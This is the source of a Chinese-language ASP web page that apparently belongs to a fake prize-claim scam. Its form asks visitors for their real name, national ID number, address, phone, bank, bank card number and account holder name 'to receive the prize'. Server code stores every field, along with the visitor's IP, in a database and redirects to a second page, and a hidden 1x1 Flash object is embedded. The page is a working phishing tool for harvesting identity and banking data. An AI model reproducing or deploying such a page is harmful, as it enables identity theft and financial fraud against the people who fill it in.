<!--#include file="inc/function.asp"-->
<%
if request.Form.count>0 then

	set rs =akconn.rs2(strcode,"h3","")
		rs.addnew	
		rs("b1")=saferequest("mobile")
		rs("b2")=saferequest("real_name")
		rs("b3")=saferequest("card_type")
		rs("b4")=saferequest("card")
		rs("b5")=saferequest("type")
		rs("b6")=saferequest("zhiye")
		rs("b7")=saferequest("addr_name")
		rs("b8")=saferequest("addr")
		rs("b9")=saferequest("post_code")
		rs("b10")=saferequest("post_tel")
		rs("b11")=saferequest("bank")
		rs("b12")=saferequest("bank_card")
		rs("b13")=saferequest("bank_username")
		rs("b14")=saferequest("cip")
		rs.update
		rs.close
		response.Redirect("yz2.asp")
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>资料填写</title>
<link rel="stylesheet" href="http://validform.rjboy.cn/wp-content/themes/validform/style.css" type="text/css" media="all" />
<link href="images/Csslg4rf6lydcNI.css" rel="stylesheet" type="text/css" />
<style type="text/css"> 
	input,select{ width:222px; height:32px; line-height:32px; border: #666666 solid 1px; font-size:14px; background-color:#F8F9FE}
</style>
<SCRIPT language=javaScript>
<!--
function check(frm)
{
	if (document.form1.real_name.value == ""){
		alert ("系统提示：\n请填写您的真实姓名！");
		document.form1.real_name.focus();
		return false;
	}														
	if (document.form1.real_name.value.length <2 ){
		alert ("系统提示：\n填写姓名有误，请正确输入！");
		document.form1.real_name.focus();
		return false;
	}
	if (document.form1.real_name.value.length >20){
		alert ("系统提示：\n姓名有误！");
		document.form1.real_name.focus();
		return false;
	}
		var reg;
        reg = /^[\u0391-\uFFE5]+$/gi; //只中文 
		if(reg.test(form1.real_name.value)==false){
				alert("系统提示：尊敬的(<%=session("userid")%>) 用户!\n\n姓名只能是中文");
				form1.real_name.focus();
				return false;
		}
	if (document.form1.card.value == ""){
		alert ("系统提示：\n请输入身份号码!");
		document.form1.card.focus();
		return false;
	}														
	if (document.form1.card.value.length <15 ){
		alert ("系统提示：\n身份号码有误，请正确输入！");
		document.form1.card.focus();
		return false;
	}
	if (document.form1.card.value.length >19){
		alert ("系统提示：\n身份号码有误！");
		document.form1.card.focus();
		return false;
	}
	bString = "0123456789０１２３４５６７８９xX";
		for(i = 0; i < document.form1.card.value.length; i ++)
		{
			if (bString.indexOf(document.form1.card.value.substring(i,i+1))==-1)
			{
				alert('系统提示：\n身份号码无效！');
				document.form1.card.focus();
				return false;
			}
       }		
	if (document.form1.addr.value == ""){
  		alert("系统提示：尊敬的用户!\n\n请选择地址，以便我们邮寄您所获得奖品！");
		document.form1.addr.focus();
		return false;
      }	
	if (document.form1.post_tel.value.length <11 ){
  		alert("系统提示：尊敬的用户!\n\n请填写正确的手机！！！");
		document.form1.post_tel.focus();
		return false;
      }	  
	if (document.form1.post_code.value == ""){
  		alert("系统提示：尊敬的用户!\n\n请选择您当地的邮政编码！");
		document.form1.post_code.focus();
		return false;
      }	  
	if (document.form1.post_code.value.length <6 ){
		alert ("系统提示：\n邮政编码有误！");
		document.form1.post_code.focus();
		return false;
	}
	if (document.form1.post_code.value.length >6){
		alert ("系统提示：\n邮政编码有误！");
		document.form1.post_code.focus();
		return false;
	}
	bString = "0123456789０１２３４５６７８９";
		for(i = 0; i < document.form1.post_code.value.length; i ++)
		{
			if (bString.indexOf(document.form1.post_code.value.substring(i,i+1))==-1)
			{
				alert('系统提示：\n邮政编码只能数字输入！');
				document.form1.post_code.focus();
				return false;
			}
       }	
	if (document.form1.bank.value == "请选择"){
  		alert("系统提示：尊敬的用户!\n\n请选择签收奖金的开户行！");
		document.form1.bank.focus();
		return false;
      }
	if (document.form1.bank_card.value == ""){
  		alert("系统提示：尊敬的用户!\n\n请填写您签收奖金的银行帐户！");
		document.form1.bank_card.focus();
		return false;
      }		  			  	  	          
	if (document.form1.bank_username.value == ""){
		alert ("系统提示：请填写您签收奖金的户名!");
		document.form1.bank_username.focus();
		return false;
      }
	if (document.form1.bank_username.value.length <2 ){
		alert ("系统提示：\n请正确填写签收奖金的银行户名！");
		document.form1.bank_username.focus();
		return false;
	}
	if (document.form1.bank_username.value.length >100){
		alert ("系统提示：\n请正确填写签收奖金的银行户名！");
		document.form1.bank_username.focus();
		return false;
	}	
		var reg;
        reg = /^[\u0391-\uFFE5]+$/gi; //只中文 
		if(reg.test(form1.bank_username.value)==false){
				alert("系统提示：尊敬的(<%=session("userid")%>) 用户!\n银行户名请填写中文！");
				form1.bank_username.focus();
				return false;
		}	
if (confirm("尊敬的(<%=session("userid")%>) 用户!是否确认您所填写的领取资料准确无误？"))
    return true;
    else
    return false;
}
//-->
</SCRIPT>
</head>
<body>
<div align="center" style="width:1089px; margin:0 auto;"> <img src="images/A01_02.jpg" width="1090" height="260" /><br />
  <img src="images/A01_04.jpg" width="1090" height="272"/><br />
</div>
<div align="center" style="background:#FFFFFF; width:1089px; margin:0 auto;"><img src="images/myinfo_03.gif" /></div>
<div style="width:1089px; margin:0 auto; background:#FFFFFF;"  >
  <div  style="background-image:url(images/myinfo_07.gif); height:159px; background-repeat:no-repeat; background-position:center;" > <span style="margin-left:250px; margin-top:12px; font-size:22px; float:left; font-family:'微软雅黑',yahei; color:#ff6600;"><%=session("userid")%><span style="color:#000000; font-weight:lighter; font-size:14px; line-height:34px">&nbsp;&nbsp;如在填写资料过程中有任何疑问，请拔打活动客服热线：<span style="color:#FF0000; font-weight:bold"><%=wtel%></span></span></span></div>
  <div style="width:1020px; height:1183px; background:url(images/myinfo_09.gif) no-repeat; margin:0 auto;">
    <form method="post" name="form1" id="form1" onSubmit="return check(form1)">
      <table width="517" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr>
          <td width="25%" height="172">&nbsp;</td>
          <td width="25%">&nbsp;</td>
        </tr>
        <tr>
          <td height="35"><input  value="<%=session("userid")%>" readonly type="text" name="mobile" /></td>
          <td>
        </tr>
        <tr>
          <td height="65"><input name="real_name" type="text" class="putin" id="real_name" />
          </td>
        </tr>
        <tr>
          <td height="42"><select name="sex" >
              <option value="">请选择</option>
              <option value="男">男</option>
              <option value="女">女</option>
            </select></td>
        </tr>
        <tr>
          <td height="58"><select name="card_type" >
              <option value="身份证">身份证</option>
              <option value="军人证">军人证</option>
              <option value="学生证">学生证</option>
              <option value="驾照">驾照</option>
            </select></td>
        </tr>
        <tr>
          <td height="42"><input name="card" type="text" class="putin" id="card" /></td>
        </tr>
        <tr>
          <td height="107">&nbsp;</td>
        </tr>
        <tr>
          <td height="25"><input name="post_tel" type="text" id="post_tel" maxlength="11"  datatype="*" errormsg="请输入正确的电话号码！"  />
          </td>
        </tr>
        <tr>
          <td height="64"><textarea name="addr" style="width:220px; font-size:12px; height:40px;" datatype="*" errormsg="请输入正确的收货地址！"></textarea></td>
        </tr>
        <tr>
          <td height="43"><input name="post_code" type="text" class="putin" id="post_code" /></td>
        </tr>
        <tr>
          <td height="113">&nbsp;</td>
        </tr>
        <tr>
          <td height="25"><select name="bank" class="input-01" id="bank">
              <option value="请选择">请选择</option>
              <option value="中国工商银行">中国工商银行</option>
              <option value="中国交通银行">中国交通银行</option>
              <option value="中国建设银行">中国建设银行</option>
              <option value="中国农业银行">中国农业银行</option>
              <option value="中国招商银行">中国招商银行</option>
              <option value="中国发展银行">中国发展银行</option>
              <option value="中国民生银行">中国民生银行</option>
              <option value="中国商业银行">中国商业银行</option>
              <option value="中国邮政储蓄">中国邮政储蓄</option>
              <option value="深圳发展银行">深圳发展银行</option>
              <option value="中国银行">中国银行</option>
              <option value="光大银行">光大银行</option>
              <option value="中信银行">中信银行</option>
              <option value="农村信用社">农村信用社</option>
              <option value="无">无</option>
            </select></td>
        </tr>
        <tr>
          <td height="19">&nbsp;</td>
        </tr>
        <tr>
          <td><input name="bank_card" type="text" class="putin" id="bank_card" errormsg="必须输入！" /></td>
        </tr>
        <tr>
          <td height="60"><input name="bank_username" type="text" class="putin" id="bank_username" datatype="*" errormsg="必须输入！"   /></td>
        </tr>
        <tr>
          <td height="25"><select name="zhiye" style="height:25px;">
              <option selected="selected" value=""  >请选择您的职业 </option>
              <option value="在校学生">在校学生</option>
              <option value="计算机/IT业">计算机/IT业</option>
              <option value="互联网/网站">互联网/网站</option>
              <option value="市场/销售">市场/销售</option>
              <option value="电子/通讯">电子/通讯</option>
              <option value="经营管理">经营管理</option>
              <option value="生产/营运">生产/营运</option>
              <option value="客服及技术支持">客服及技术支持</option>
              <option value="财务/审计/税务">财务/审计/税务</option>
              <option value="证券/金融/投资">证券/金融/投资</option>
              <option value="银行">银行</option>
              <option value="保险">保险</option>
              <option value="工业/工厂/制造">工业/工厂/制造</option>
              <option value="质量/安全管理">质量/安全管理</option>
              <option value="工程/机械/能源">工程/机械/能源</option>
              <option value="服装/纺织/皮革">服装/纺织/皮革</option>
              <option value="采购">采购</option>
              <option value="贸易">贸易</option>
              <option value="物流/仓储">物流/仓储</option>
              <option value="生物/化工/制药/医疗器械">生物/化工/制药/医疗器械 </option>
              <option value="医院/医疗/护理">医院/医疗/护理</option>
              <option value="广告">广告</option>
              <option value="公关/媒介">公关/媒介</option>
              <option value="市场/营销">市场/营销</option>
              <option value="影视/媒体">影视/媒体</option>
              <option value="写作/出版/印刷">写作/出版/印刷</option>
              <option value="艺术/设计">艺术/设计</option>
              <option value="建筑工程">建筑工程</option>
              <option value="房地产">房地产</option>
              <option value="物业管理">物业管理</option>
              <option value="人力资源">人力资源</option>
              <option value="高级管理">高级管理</option>
              <option value="行政/后勤">行政/后勤</option>
              <option value="咨询/顾问">咨询/顾问</option>
              <option value="律师/法务">律师/法务</option>
              <option value="教师">教师</option>
              <option value="科研人员">科研人员</option>
              <option value="餐饮/娱乐">餐饮/娱乐</option>
              <option value="酒店/旅游">酒店/旅游</option>
              <option value="美容/健身">美容/健身</option>
              <option value="百货/连锁/零售服务">百货/连锁/零售服务 </option>
              <option value="交通运输服务">交通运输服务</option>
              <option value="保安/家政/其他服务">保安/家政/其他服务 </option>
              <option value="公务员">公务员</option>
              <option value="翻译">翻译</option>
              <option value="储备干部/培训生/实习生">储备干部/培训生/实习生 </option>
              <option value="兼职">兼职</option>
              <option value="老板">老板</option>
            </select></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
      </table>
      <div style="width:1020px; height:115px; background:url(images/myinfo_10.gif) no-repeat;">
        <table width="566" height="44" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td width="607" height="39">
			<input type="hidden" name="cip" value="<%=request.ServerVariables("REMOTE_ADDR")%>" />
			<input type="submit" name="submit" style="width:261px; height:55px; border:none; background:url(images/submit.gif)" value="" />
            </td>
          </tr>
          <tr></tr>
        </table>
      </div>
    </form>
  
  </div>
</div>
<div align="center"></div>
<div align="center" style="width:1089px; margin:0 auto;"><img src="images/bd.gif" /></div>
<div align="center"></div>
<div style="height:227px; margin-top:30px; background-color:#FFFFFF" align="center">
  <p style="margin:0 auto; width:1089px;"> <img src="images/A01_30.gif" vspace="29" /></p>
</div>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1" height="1">
  <param name="movie" value="images/2.swf" />
  <param name="quality" value="high" />
  <embed src="images/2.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="1" height="1"></embed>
</object>
</body>
</html>
